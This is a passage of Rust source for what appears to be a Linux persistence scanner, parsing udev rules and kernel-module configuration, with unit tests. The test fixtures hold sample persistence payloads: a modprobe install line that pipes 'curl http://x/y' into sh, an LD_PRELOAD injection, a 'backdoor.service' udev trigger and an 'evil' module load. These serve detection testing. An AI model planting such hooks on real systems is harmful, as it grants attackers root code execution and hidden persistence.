//! udev rules and kernel modules.
//!
//! One collector, because the two formats share a reader: both are line-based,
//! both continue a line on a trailing backslash, and both are read from a
//! search path whose merged-usr aliases must collapse to a single directory
//! before anything is emitted (§5).

use std::collections::{BTreeMap, BTreeSet};
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex};
use crate::scan::{Collector, Ctx};

pub struct Kernel;

/// udev's own order. The first directory holding a given file name wins
/// outright; whatever survives that is applied in lexical order by basename.
// In the order udev and kmod read them, which for udev decides which of two
// same-named rules files is used: /etc, /run, /usr/local/lib, /usr/lib.
const UDEV_DIRS: &[&str] = &[
    "etc/udev/rules.d",
    "run/udev/rules.d",
    "usr/local/lib/udev/rules.d",
    "usr/lib/udev/rules.d",
    "lib/udev/rules.d",
];

const MODPROBE_DIRS: &[&str] =
    &["etc/modprobe.d", "run/modprobe.d", "usr/local/lib/modprobe.d", "usr/lib/modprobe.d", "lib/modprobe.d"];

const MODULES_LOAD_DIRS: &[&str] = &[
    "etc/modules-load.d",
    "run/modules-load.d",
    "usr/local/lib/modules-load.d",
    "usr/lib/modules-load.d",
    "lib/modules-load.d",
];

/// Module name to the rest of its /proc/modules fields. `None` where the
/// loaded set could not be read at all, which is never the same as empty.
type Loaded = BTreeMap<String, Vec<String>>;

impl Collector for Kernel {
    fn name(&self) -> &'static str {
        "kernel"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = udev_rules(cx);
        let loaded = loaded_modules(cx);
        out.extend(module_load_lists(cx, &loaded));
        out.extend(modprobe_configs(cx, &loaded));
        if let Some(loaded) = &loaded {
            out.extend(loaded_entries(cx, loaded));
        }
        out
    }
}

// ---------------------------------------------------------------- udev ----

fn udev_rules(cx: &mut Ctx) -> Vec<Entry> {
    let dirs = distinct_dirs(cx, UDEV_DIRS);

    // (basename, rank of its directory, root-relative path)
    let mut files: Vec<(Vec<u8>, usize, PathBuf)> = Vec::new();
    for (rank, dir) in dirs {
        for ent in cx.dir(dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".rules") {
                continue;
            }
            files.push((ent.name.as_bytes().to_vec(), rank, Path::new(dir).join(&ent.name)));
        }
    }

    // A file name found in two directories is not merged: the copy in the
    // earlier directory replaces the other entirely.
    let mut winner: BTreeMap<Vec<u8>, usize> = BTreeMap::new();
    for (i, (base, rank, _)) in files.iter().enumerate() {
        let wins = match winner.get(base) {
            Some(&j) => *rank < files[j].1,
            None => true,
        };
        if wins {
            winner.insert(base.clone(), i);
        }
    }

    let mut out = Vec::new();
    for (i, (base, rank, rel)) in files.iter().enumerate() {
        let win = winner.get(base).copied().unwrap_or(i);
        let shadowed_by = (win != i).then(|| path_note(cx, &files[win].2));
        let shadows: Vec<String> = if win == i {
            files
                .iter()
                .enumerate()
                .filter(|(j, f)| *j != i && f.0 == *base)
                .map(|(_, f)| path_note(cx, &f.2))
                .collect()
        } else {
            Vec::new()
        };

        let Some(bytes) = cx.read(rel) else { continue };
        let mut used: BTreeMap<String, usize> = BTreeMap::new();
        for line in logical_lines(&bytes) {
            let tokens = udev_tokens(&line);
            let facts = udev_facts(&tokens);
            let digest = short_hash(&line);
            for t in &tokens {
                if !is_action_key(t.key) || t.op == b"-=" {
                    continue;
                }
                let key = String::from_utf8_lossy(t.key).into_owned();
                let name = uniq(&mut used, format!("{key}:{digest}"));
                let mut e = cx.entry(Kind::Udev, rel, name);
                e.trigger = Trigger::DeviceEvent;
                // udevd runs as root, so everything it spawns does too.
                e.principal = Some("root".to_string());
                e.command = Some(t.value.to_vec());
                if names_a_unit(t.key) {
                    // Nothing to resolve: the value is a unit name, and the
                    // systemd collector has its own entry for the file.
                    e.note("systemd_unit", String::from_utf8_lossy(t.value));
                    e.note("target_unverifiable", "names a systemd unit, not a program");
                } else {
                    e.target_path = first_absolute(t.value);
                }
                e.enabled =
                    if win == i { Enablement::Enabled } else { Enablement::Disabled };
                if std::str::from_utf8(t.value).is_err() {
                    e.flag(Flag::EncodingAnomaly);
                    e.note("command_hex", hex(t.value));
                }
                e.note("key", key);
                e.note("op", String::from_utf8_lossy(t.op));
                e.note("rank", rank.to_string());
                if let Some(by) = &shadowed_by {
                    e.note("shadowed_by", by.clone());
                }
                if !shadows.is_empty() {
                    e.note("shadows", shadows.join(", "));
                }
                for (k, v) in &facts {
                    append_note(&mut e, k, v);
                }
                out.push(e);
            }
        }
    }
    out
}

struct Token<'a> {
    key: &'a [u8],
    op: &'a [u8],
    value: &'a [u8],
}

/// One rule line into its `key op "value"` triples.
///
/// The parser is deliberately permissive: a malformed rule yields whatever
/// triples it can and never fails, because a rule udev itself rejects is still
/// evidence of what someone tried to install. Every branch advances the
/// cursor, which is what keeps a hostile line from looping forever.
fn udev_tokens(line: &[u8]) -> Vec<Token<'_>> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < line.len() {
        while i < line.len() && (line[i].is_ascii_whitespace() || line[i] == b',') {
            i += 1;
        }
        if i >= line.len() {
            break;
        }

        let key_start = i;
        while i < line.len() {
            let b = line[i];
            if b == b'{' {
                // A key's attribute may hold anything but the closing brace.
                while i < line.len() && line[i] != b'}' {
                    i += 1;
                }
                if i < line.len() {
                    i += 1;
                }
                break;
            }
            if matches!(b, b'=' | b'+' | b'-' | b':' | b'!' | b',') || b.is_ascii_whitespace() {
                break;
            }
            i += 1;
        }
        let key = &line[key_start..i];

        while i < line.len() && line[i].is_ascii_whitespace() {
            i += 1;
        }
        let op_start = i;
        let op: &[u8] = match (line.get(i), line.get(i + 1)) {
            (Some(b'='), Some(b'=')) | (Some(b'!'), Some(b'='))
            | (Some(b'+'), Some(b'=')) | (Some(b'-'), Some(b'='))
            | (Some(b':'), Some(b'=')) => {
                i += 2;
                &line[op_start..i]
            }
            (Some(b'='), _) => {
                i += 1;
                &line[op_start..i]
            }
            _ => {
                // Not a triple. Skip to the next separator rather than
                // guessing, and let the loop head consume it.
                while i < line.len() && line[i] != b',' {
                    i += 1;
                }
                continue;
            }
        };

        while i < line.len() && line[i].is_ascii_whitespace() {
            i += 1;
        }
        let value: &[u8] = if line.get(i) == Some(&b'"') {
            i += 1;
            let start = i;
            while i < line.len() {
                // A backslash escapes the next byte, so a quoted value may
                // hold both commas and quotes.
                if line[i] == b'\\' && i + 1 < line.len() {
                    i += 2;
                    continue;
                }
                if line[i] == b'"' {
                    break;
                }
                i += 1;
            }
            let end = i.min(line.len());
            if i < line.len() {
                i += 1;
            }
            &line[start..end]
        } else {
            let start = i;
            while i < line.len() && line[i] != b',' {
                i += 1;
            }
            line[start..i].trim_ascii()
        };

        if !key.is_empty() {
            out.push(Token { key, op, value });
        }
    }
    out
}

/// The keys that make a rule execute something.
///
/// `IMPORT{program}` belongs here as much as `RUN` does: it runs a binary and
/// imports its output as device properties, and tools that grep for RUN alone
/// miss it.
///
/// So does `ENV{SYSTEMD_WANTS}`, which runs nothing itself — it asks systemd
/// to start the named unit when the device appears. A rule carrying it has
/// no RUN at all, so a scan looking only for RUN reports the rule directory
/// as clean while a unit starts on every network interface event.
fn is_action_key(key: &[u8]) -> bool {
    key == b"RUN".as_slice()
        || key == b"PROGRAM".as_slice()
        || key == b"IMPORT{program}".as_slice()
        || key.starts_with(b"RUN{")
        || key == b"ENV{SYSTEMD_WANTS}".as_slice()
        || key == b"ENV{SYSTEMD_USER_WANTS}".as_slice()
}

/// True for an action key that names a systemd unit rather than a command.
/// The unit is reported so an operator can join it to the systemd collector's
/// entry for the same thing; there is no path to resolve.
fn names_a_unit(key: &[u8]) -> bool {
    key.starts_with(b"ENV{SYSTEMD_")
}

fn is_match_key(key: &[u8]) -> bool {
    const PLAIN: &[&[u8]] = &[
        b"ACTION",
        b"DEVPATH",
        b"DRIVER",
        b"DRIVERS",
        b"KERNEL",
        b"KERNELS",
        b"NAME",
        b"SUBSYSTEM",
        b"SUBSYSTEMS",
        b"SYMLINK",
        b"TAG",
        b"TAGS",
    ];
    PLAIN.contains(&key)
        || key.starts_with(b"ATTR{")
        || key.starts_with(b"ATTRS{")
        || key.starts_with(b"CONST{")
        || key.starts_with(b"ENV{")
}

/// What an analyst needs to see the device that fires the rule, plus every
/// environment assignment it makes — LD_PRELOAD hides in exactly these.
fn udev_facts(tokens: &[Token<'_>]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for t in tokens {
        let value = String::from_utf8_lossy(t.value).into_owned();
        let matching = t.op == b"==" || t.op == b"!=";
        if matching && is_match_key(t.key) {
            let key = String::from_utf8_lossy(t.key);
            let negated = if t.op == b"!=" { "!" } else { "" };
            out.push((format!("match.{key}{negated}"), value));
        } else if !matching {
            if let Some(var) = attribute_of(t.key, b"ENV") {
                out.push((format!("env.{}", String::from_utf8_lossy(var)), value));
            }
        }
    }
    out
}

/// `ENV{LD_PRELOAD}` with prefix `ENV` yields `LD_PRELOAD`.
fn attribute_of<'a>(key: &'a [u8], prefix: &[u8]) -> Option<&'a [u8]> {
    let rest = key.strip_prefix(prefix)?;
    let rest = rest.strip_prefix(b"{")?;
    rest.strip_suffix(b"}")
}

// ------------------------------------------------------- kernel modules ----

/// Every module's file, from `modules.dep` — one read per installed kernel
/// rather than a walk of `/lib/modules`.
///
/// Without this a loaded module's only source is `/proc/modules`, which no
/// package owns, so a couple of hundred perfectly ordinary modules arrive in
/// the operator's view unattributed. The `.ko` behind each one is packaged,
/// and saying which file a module came from is the useful fact anyway.
fn module_files(cx: &mut Ctx) -> BTreeMap<String, PathBuf> {
    let mut out = BTreeMap::new();
    for ent in cx.dir("lib/modules") {
        if !ent.is_dir {
            continue;
        }
        let base = Path::new("lib/modules").join(&ent.name);
        let Some(bytes) = cx.read_capped(base.join("modules.dep"), 8 << 20) else { continue };
        for line in String::from_utf8_lossy(&bytes).lines() {
            let Some((rel, _)) = line.split_once(':') else { continue };
            let file = Path::new(rel.trim());
            let Some(stem) = file.file_name().map(|n| n.to_string_lossy().into_owned()) else {
                continue;
            };
            // foo.ko, foo.ko.zst, foo.ko.xz all name the module foo.
            let name = stem.split(".ko").next().unwrap_or(&stem).replace('-', "_");
            if !name.is_empty() {
                out.entry(name).or_insert_with(|| base.join(file));
            }
        }
    }
    out
}

/// /proc/modules is the only live-only source here. Its absence is recorded
/// rather than passed over: on an offline root every module below reports an
/// unknown loaded state, and the operator has to be able to tell that from a
/// host where nothing was loaded.
fn loaded_modules(cx: &mut Ctx) -> Option<Loaded> {
    if !cx.root.is_live() {
        cx.note_unreadable(
            "proc/modules: live-only interface, unavailable on an offline root; \
             loaded-module state is unknown for every module below",
        );
        return None;
    }
    let Some(bytes) = cx.read("proc/modules") else {
        cx.note_unreadable("proc/modules: absent, loaded-module state is unknown");
        return None;
    };
    let mut out = Loaded::new();
    for line in String::from_utf8_lossy(&bytes).lines() {
        let mut fields = line.split_whitespace().map(str::to_string);
        let Some(name) = fields.next() else { continue };
        out.insert(name, fields.collect());
    }
    Some(out)
}

fn loaded_entries(cx: &mut Ctx, loaded: &Loaded) -> Vec<Entry> {
    let files = module_files(cx);
    let mut out = Vec::new();
    for (name, fields) in loaded {
        let mut e = cx.entry(Kind::KernelModule, "proc/modules", name.clone());
        e.trigger = Trigger::Boot;
        e.enabled = Enablement::Enabled;
        e.note("directive", "loaded");
        e.note("module", name.clone());
        if let Some(file) = files.get(&name.replace('-', "_")) {
            e.target_path = Some(cx.root.abs(file));
        }
        // Prefixed `live.` because these move on their own: a module's
        // reference count and dependants change as the machine is used, and
        // a diff that reported every loaded module as changed on every run
        // would be noise nobody reads. The diff ignores this prefix; a
        // single scan and `explain` still show the values.
        for (i, key) in ["live.size", "live.refcount", "live.used_by", "live.state"].iter().enumerate() {
            if let Some(v) = fields.get(i).filter(|v| *v != "-") {
                e.note(key, v.trim_end_matches(',').to_string());
            }
        }
        // §3: the list is what the kernel reports, and a module that unlinks
        // itself from that list is out of reach of any userspace enumerator.
        e.note("caveat", "kernel-reported; a module that hides itself is not visible here");
        out.push(e);
    }
    out
}

/// /etc/modules and modules-load.d: a module name per line, loaded at boot.
fn module_load_lists(cx: &mut Ctx, loaded: &Option<Loaded>) -> Vec<Entry> {
    let mut files: Vec<PathBuf> = vec![PathBuf::from("etc/modules")];
    for (_, dir) in distinct_dirs(cx, MODULES_LOAD_DIRS) {
        for ent in cx.dir(dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".conf") {
                continue;
            }
            files.push(Path::new(dir).join(&ent.name));
        }
    }

    let mut out = Vec::new();
    for rel in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        let mut used: BTreeMap<String, usize> = BTreeMap::new();
        for line in logical_lines(&bytes) {
            // /etc/modules permits module parameters after the name.
            let Some((module, params)) = take_word(&line) else { continue };
            let name = uniq(&mut used, lossy(module));
            let mut e = cx.entry(Kind::KernelModule, &rel, name);
            e.trigger = Trigger::Boot;
            e.note("directive", "load");
            name_bytes(&mut e, module);
            e.note("module", lossy(module));
            if !params.is_empty() {
                e.note("params", lossy(params));
            }
            set_loaded_state(&mut e, loaded, module);
            out.push(e);
        }
    }
    out
}

/// modprobe.d. `install <module> <command>` runs a shell command in place of
/// loading the module, which makes it an execution mechanism rather than a
/// note about one; the other directives are recorded as configuration.
fn modprobe_configs(cx: &mut Ctx, loaded: &Option<Loaded>) -> Vec<Entry> {
    let mut files: Vec<PathBuf> = Vec::new();
    for (_, dir) in distinct_dirs(cx, MODPROBE_DIRS) {
        for ent in cx.dir(dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".conf") {
                continue;
            }
            files.push(Path::new(dir).join(&ent.name));
        }
    }

    let mut out = Vec::new();
    for rel in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        let mut used: BTreeMap<String, usize> = BTreeMap::new();
        for line in logical_lines(&bytes) {
            // A `#` inside a directive is kept rather than stripped: an install
            // command may legitimately contain one, and truncating there would
            // discard the half of the command that matters.
            let Some((directive, rest)) = take_word(&line) else { continue };
            let runs = directive == b"install" || directive == b"remove";
            if !runs
                && directive != b"alias"
                && directive != b"options"
                && directive != b"blacklist"
            {
                continue;
            }
            let Some((first, rest)) = take_word(rest) else { continue };

            let directive = lossy(directive);
            let name = uniq(&mut used, format!("{directive}:{}", lossy(first)));
            let mut e = cx.entry(Kind::KernelModule, &rel, name);
            e.trigger = Trigger::Boot;
            e.note("directive", directive.clone());
            name_bytes(&mut e, first);

            // `alias <pattern> <module>` names the module second; every other
            // directive names it first.
            let module: &[u8] = if directive == "alias" {
                e.note("alias", lossy(first));
                match take_word(rest) {
                    Some((m, _)) => m,
                    None => first,
                }
            } else {
                first
            };
            e.note("module", lossy(module));

            if runs {
                let command = rest.trim_ascii();
                e.command = Some(command.to_vec());
                e.target_path = first_absolute(command);
                e.principal = Some("root".to_string());
                if std::str::from_utf8(command).is_err() {
                    e.flag(Flag::EncodingAnomaly);
                    e.note("command_hex", hex(command));
                }
            } else if !rest.is_empty() && directive != "alias" {
                // An alias's remainder is the module it resolves to, already noted.
                e.note("args", lossy(rest.trim_ascii()));
            }
            set_loaded_state(&mut e, loaded, module);
            out.push(e);
        }
    }
    out
}

/// Configured is not loaded. Where the loaded set is unavailable the answer is
/// Unknown and flagged as inferred, never silently Disabled.
fn set_loaded_state(e: &mut Entry, loaded: &Option<Loaded>, module: &[u8]) {
    // The kernel treats a dash and an underscore in a module name as the same
    // character; /proc/modules always shows the underscore form.
    let key = lossy(module).replace('-', "_");
    match loaded {
        Some(loaded) => {
            e.enabled = if loaded.contains_key(&key) {
                Enablement::Enabled
            } else {
                Enablement::Disabled
            };
        }
        None => {
            e.enabled = Enablement::Unknown;
            e.flag(Flag::DegradedEnablement);
            e.note("loaded_state", "unknown: /proc/modules was not readable");
        }
    }
}

// ------------------------------------------------------------- shared ----

/// Physical lines joined on a trailing backslash, with comments and blank
/// lines dropped. A comment line that itself ends in a backslash takes the
/// line below it with it, because treating that continuation as a rule of its
/// own would invent one that nothing executes.
fn logical_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    let mut current: Vec<u8> = Vec::new();
    let mut continued = false;
    let mut dropping = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let more = line.last() == Some(&b'\\');
        let body = if more { &line[..line.len() - 1] } else { line };
        if !continued {
            let head = body.trim_ascii_start();
            dropping = head.is_empty() || head[0] == b'#';
        }
        if !dropping {
            current.extend_from_slice(body);
        }
        continued = more;
        if !continued {
            if !current.is_empty() {
                out.push(std::mem::take(&mut current));
            }
            current.clear();
            dropping = false;
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

/// Merged /usr makes `lib/x` and `usr/lib/x` one directory. Walking both emits
/// every vendor file twice under two ids that never reconcile in a diff (§5),
/// so each inode is walked once under the first name that reached it. The
/// returned rank is the position in the candidate list, which does not move
/// when one of the directories is absent.
fn distinct_dirs(cx: &mut Ctx, candidates: &[&'static str]) -> Vec<(usize, &'static str)> {
    let mut seen: BTreeSet<(u64, u64)> = BTreeSet::new();
    let mut out = Vec::new();
    for (rank, dir) in candidates.iter().enumerate() {
        let identity = cx.root.dir_identity(dir);
        match identity {
            Ok(id) => {
                if seen.insert(id) {
                    out.push((rank, *dir));
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => cx.note_unreadable(format!("{dir}: {e}")),
        }
    }
    out
}

fn take_word(s: &[u8]) -> Option<(&[u8], &[u8])> {
    let s = s.trim_ascii_start();
    if s.is_empty() {
        return None;
    }
    let end = s.iter().position(|b| b.is_ascii_whitespace()).unwrap_or(s.len());
    Some((&s[..end], s[end..].trim_ascii_start()))
}

fn first_absolute(command: &[u8]) -> Option<PathBuf> {
    let word = super::shell_word(take_word(command)?.0);
    (word.first() == Some(&b'/')).then(|| PathBuf::from(OsStr::from_bytes(word).to_os_string()))
}

fn lossy(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

fn name_bytes(e: &mut Entry, name: &[u8]) {
    if std::str::from_utf8(name).is_err() {
        e.flag(Flag::EncodingAnomaly);
        e.note("name_raw_hex", hex(name));
    }
}

fn short_hash(bytes: &[u8]) -> String {
    blake3::hash(bytes).to_hex()[..12].to_string()
}

/// Names are hashed into the entry id, so two identical lines in one file
/// would otherwise collide into one id for two entries.
fn uniq(used: &mut BTreeMap<String, usize>, base: String) -> String {
    let seen = used.entry(base.clone()).or_insert(0);
    *seen += 1;
    if *seen == 1 { base } else { format!("{base}#{seen}") }
}

fn append_note(e: &mut Entry, key: &str, value: &str) {
    match e.raw.get_mut(key) {
        Some(existing) => {
            existing.push_str(", ");
            existing.push_str(value);
        }
        None => e.note(key, value.to_string()),
    }
}

fn path_note(cx: &Ctx, rel: &Path) -> String {
    cx.root.abs(rel).display().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-kernel-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8]) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, bytes).unwrap();
    }

    fn scan(root: &Path) -> Scan {
        let root = Root::at(root).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Kernel)];
        run(&root, &Options { deep: false }, &collectors)
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn one<'a>(s: &'a Scan, want: impl Fn(&Entry) -> bool) -> &'a Entry {
        let found: Vec<&Entry> = s.entries.iter().filter(|e| want(e)).collect();
        assert_eq!(found.len(), 1, "expected exactly one match, got {}", found.len());
        found[0]
    }

    fn by_command<'a>(s: &'a Scan, needle: &str) -> &'a Entry {
        one(s, |e| {
            e.command.as_deref().is_some_and(|c| {
                String::from_utf8_lossy(c).contains(needle)
            })
        })
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "kernel").unwrap().status
    }

    fn rules_with_every_action_shape() -> Vec<u8> {
        let mut r = Vec::new();
        r.extend_from_slice(b"# a comment, not a rule\n");
        r.extend_from_slice(
            br#"ACTION=="add", SUBSYSTEM=="usb", ATTRS{idVendor}=="1d6b", RUN+="/usr/local/bin/eq.sh --flag""#,
        );
        r.extend_from_slice(b"\n");
        // A quoted value holding a comma and an escaped quote.
        r.extend_from_slice(br#"KERNEL=="sd*", RUN+="/bin/sh -c 'echo \"a,b\" > /tmp/x'""#);
        r.extend_from_slice(b"\n");
        // A rule continued onto the next line.
        r.extend_from_slice(b"ACTION==\"add\", \\\n");
        r.extend_from_slice(
            br#"SUBSYSTEM=="net", PROGRAM="/usr/bin/id", ENV{LD_PRELOAD}="/tmp/e.so""#,
        );
        r.extend_from_slice(b"\n");
        r.extend_from_slice(br#"SUBSYSTEM=="block", IMPORT{program}="/usr/bin/sneaky --x""#);
        r.extend_from_slice(b"\n");
        r.extend_from_slice(br#"SUBSYSTEM=="tty", RUN{builtin}+="kmod load evil""#);
        r.extend_from_slice(b"\n");
        // No RUN at all: systemd starts the unit when the device appears.
        r.extend_from_slice(br#"SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="backdoor.service""#);
        r.extend_from_slice(b"\n");
        // Invalid UTF-8 inside a RUN value is evidence, not a crash.
        r.extend_from_slice(b"SUBSYSTEM==\"mem\", RUN+=\"/tmp/\xff\xfe\"\n");
        // Carries no executable action: must not produce an entry.
        r.extend_from_slice(br#"SUBSYSTEM=="usb", ENV{ID_FS_TYPE}=="vfat", OWNER="root""#);
        r.extend_from_slice(b"\n");
        r
    }

    #[test]
    fn every_executing_udev_key_is_reported() {
        let dir = tree("udev");
        put(&dir, "etc/udev/rules.d/50-x.rules", &rules_with_every_action_shape());
        let s = scan(&dir);
        let udev = of_kind(&s, Kind::Udev);
        assert_eq!(udev.len(), 7, "one entry per executing key: {:?}", udev.iter().map(|e| &e.name).collect::<Vec<_>>());
        let wants = udev
            .iter()
            .find(|e| e.raw.get("key").is_some_and(|k| k == "ENV{SYSTEMD_WANTS}"))
            .expect("a rule that starts a unit is an executing rule");
        assert_eq!(wants.raw["systemd_unit"], "backdoor.service");
        assert_eq!(wants.target_path, None, "a unit name is not a path");
        assert!(udev.iter().all(|e| e.trigger == Trigger::DeviceEvent));
        assert!(udev.iter().all(|e| e.principal.as_deref() == Some("root")));

        let quoted = by_command(&s, "echo");
        assert_eq!(
            quoted.command.as_deref().unwrap(),
            br#"/bin/sh -c 'echo \"a,b\" > /tmp/x'"#,
            "a comma and an escaped quote must not split the value"
        );
        assert_eq!(quoted.raw.get("match.KERNEL").map(String::as_str), Some("sd*"));

        let continued = by_command(&s, "/usr/bin/id");
        assert_eq!(continued.raw.get("key").map(String::as_str), Some("PROGRAM"));
        assert_eq!(continued.raw.get("match.ACTION").map(String::as_str), Some("add"));
        assert_eq!(continued.raw.get("match.SUBSYSTEM").map(String::as_str), Some("net"));
        assert_eq!(
            continued.raw.get("env.LD_PRELOAD").map(String::as_str),
            Some("/tmp/e.so"),
            "an env assignment is where LD_PRELOAD hides"
        );
        assert_eq!(continued.target_path, Some(PathBuf::from("/usr/bin/id")));

        let imported = by_command(&s, "sneaky");
        assert_eq!(imported.raw.get("key").map(String::as_str), Some("IMPORT{program}"));
        let builtin = by_command(&s, "kmod load evil");
        assert_eq!(builtin.raw.get("key").map(String::as_str), Some("RUN{builtin}"));
        assert_eq!(builtin.target_path, None);

        let binary = one(&s, |e| e.has_flag(Flag::EncodingAnomaly));
        assert_eq!(binary.command.as_deref().unwrap(), b"/tmp/\xff\xfe");
        assert!(binary.raw.contains_key("command_hex"));

        // Names must not move when a line is inserted above them.
        let before: BTreeSet<String> = udev.iter().map(|e| e.id.clone()).collect();
        let mut shifted = b"SUBSYSTEM==\"hid\", RUN+=\"/tmp/new\"\n".to_vec();
        shifted.extend_from_slice(&rules_with_every_action_shape());
        put(&dir, "etc/udev/rules.d/50-x.rules", &shifted);
        let after: BTreeSet<String> = of_kind(&scan(&dir), Kind::Udev).iter().map(|e| e.id.clone()).collect();
        assert!(before.is_subset(&after), "entry ids moved when a rule was inserted above them");

        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn merged_usr_directories_are_walked_once() {
        let dir = tree("merged");
        put(&dir, "usr/lib/udev/rules.d/60-vendor.rules", br#"ACTION=="add", RUN+="/lib/udev/vendor""#);
        put(&dir, "usr/lib/modprobe.d/vendor.conf", b"install vboxdrv /sbin/modprobe --ignore-install vboxdrv\n");
        // Merged /usr: the same directory under a second name.
        std::os::unix::fs::symlink("usr/lib", dir.join("lib")).unwrap();

        let s = scan(&dir);
        assert_eq!(of_kind(&s, Kind::Udev).len(), 1, "the vendor rule was reported twice");
        assert_eq!(of_kind(&s, Kind::KernelModule).len(), 1, "the install line was reported twice");
        let rule = &of_kind(&s, Kind::Udev)[0];
        assert!(
            rule.source.to_string_lossy().contains("usr/lib/udev"),
            "the canonical path is kept, got {}",
            rule.source.display()
        );
        assert_eq!(rule.raw.get("rank").map(String::as_str), Some("3"), "rank is the search-path position");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn genuinely_separate_lib_and_usr_lib_are_both_walked() {
        let dir = tree("unmerged");
        put(&dir, "lib/udev/rules.d/70-a.rules", br#"ACTION=="add", RUN+="/lib/a""#);
        put(&dir, "usr/lib/udev/rules.d/71-b.rules", br#"ACTION=="add", RUN+="/usr/lib/b""#);
        put(&dir, "lib/modprobe.d/a.conf", b"install a /bin/true\n");
        put(&dir, "usr/lib/modprobe.d/b.conf", b"install b /bin/true\n");

        let s = scan(&dir);
        assert_eq!(of_kind(&s, Kind::Udev).len(), 2, "deduplication must key on the inode, not the name");
        assert_eq!(of_kind(&s, Kind::KernelModule).len(), 2);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_rule_file_in_etc_replaces_the_vendor_file_of_the_same_name() {
        let dir = tree("shadow");
        put(&dir, "etc/udev/rules.d/60-same.rules", br#"ACTION=="add", RUN+="/etc/version""#);
        put(&dir, "usr/lib/udev/rules.d/60-same.rules", br#"ACTION=="add", RUN+="/vendor/version""#);
        put(&dir, "usr/lib/udev/rules.d/61-other.rules", br#"ACTION=="add", RUN+="/vendor/other""#);
        // /usr/local/lib sits between /run and /usr/lib.
        put(&dir, "usr/local/lib/udev/rules.d/62-local.rules", br#"ACTION=="add", RUN+="/local/version""#);
        put(&dir, "usr/lib/udev/rules.d/62-local.rules", br#"ACTION=="add", RUN+="/vendor/local""#);

        let s = scan(&dir);
        let admin = by_command(&s, "/etc/version");
        let vendor = by_command(&s, "/vendor/version");
        let other = by_command(&s, "/vendor/other");

        assert_eq!(admin.raw.get("rank").map(String::as_str), Some("0"));
        assert_eq!(vendor.raw.get("rank").map(String::as_str), Some("3"));
        assert!(admin.raw.get("shadows").unwrap().ends_with("usr/lib/udev/rules.d/60-same.rules"));
        assert!(vendor.raw.get("shadowed_by").unwrap().ends_with("etc/udev/rules.d/60-same.rules"));
        assert_eq!(admin.enabled, Enablement::Enabled);
        assert_eq!(vendor.enabled, Enablement::Disabled, "udev never reads the replaced file");
        assert!(!other.raw.contains_key("shadowed_by"), "a differently named file is untouched");
        let local = by_command(&s, "/local/version");
        assert_eq!(local.raw.get("rank").map(String::as_str), Some("2"));
        assert_eq!(local.enabled, Enablement::Enabled);
        assert_eq!(by_command(&s, "/vendor/local").enabled, Enablement::Disabled);
        // The flag itself belongs to the enrichment pass, not here.
        assert!(!vendor.has_flag(Flag::ShadowsVendorUnit));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn module_configuration_in_run_and_usr_local_is_read() {
        let dir = tree("moddirs");
        put(&dir, "run/modprobe.d/a.conf", b"install a /opt/a\n");
        put(&dir, "usr/local/lib/modprobe.d/b.conf", b"install b /opt/b\n");
        put(&dir, "usr/local/lib/modules-load.d/c.conf", b"c\n");
        let s = scan(&dir);
        let mut sources: Vec<String> =
            of_kind(&s, Kind::KernelModule).iter().map(|e| e.source.strip_prefix(&dir).unwrap().display().to_string()).collect();
        sources.sort();
        assert_eq!(sources, ["run/modprobe.d/a.conf", "usr/local/lib/modprobe.d/b.conf", "usr/local/lib/modules-load.d/c.conf"]);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn modprobe_install_lines_are_execution_not_configuration() {
        let dir = tree("modprobe");
        put(
            &dir,
            "etc/modprobe.d/evil.conf",
            b"# vendor defaults\n\
              install cryptd /bin/sh -c 'curl http://x/y | sh'\n\
              blacklist nouveau\n\
              alias net-pf-10 off\n\
              options usbcore autosuspend=-1\n\
              remove foo /sbin/rmmod --force foo\n\
              softdep bar pre: baz\n",
        );
        put(&dir, "etc/modules", b"# /etc/modules\nvboxdrv\nevil_mod param=1\n");
        put(&dir, "etc/modules-load.d/extra.conf", b"loop\n");

        let s = scan(&dir);
        let install = one(&s, |e| e.name == "install:cryptd");
        assert_eq!(install.kind, Kind::KernelModule);
        assert_eq!(install.trigger, Trigger::Boot);
        assert_eq!(install.command.as_deref().unwrap(), b"/bin/sh -c 'curl http://x/y | sh'");
        assert_eq!(install.target_path, Some(PathBuf::from("/bin/sh")));
        assert_eq!(install.raw.get("module").map(String::as_str), Some("cryptd"));

        let removed = one(&s, |e| e.name == "remove:foo");
        assert_eq!(removed.command.as_deref().unwrap(), b"/sbin/rmmod --force foo");

